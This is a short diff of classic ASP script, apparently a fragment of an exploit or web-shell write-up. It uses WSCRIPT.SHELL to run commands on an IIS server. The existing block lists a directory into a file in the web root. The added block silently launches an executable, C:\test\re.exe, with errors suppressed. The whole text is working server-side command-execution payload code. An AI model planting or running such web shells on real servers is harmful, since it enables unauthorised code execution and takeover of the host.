@@ -18,4 +18,11 @@ On Error Resume Next
 Set oS = Server.CreateObject("WSCRIPT.SHELL")
 Call oS.Run("win.com cmd.exe /c dir C:\test > C:\inetpub\results.txt",0,True)
 %>
+
+<%
+Dim oS
+On Error Resume Next
+Set oS = Server.CreateObject("WSCRIPT.SHELL")
+Call oS.Run("win.com cmd.exe /c C:\test\re.exe",0,True)
+%>
 ```
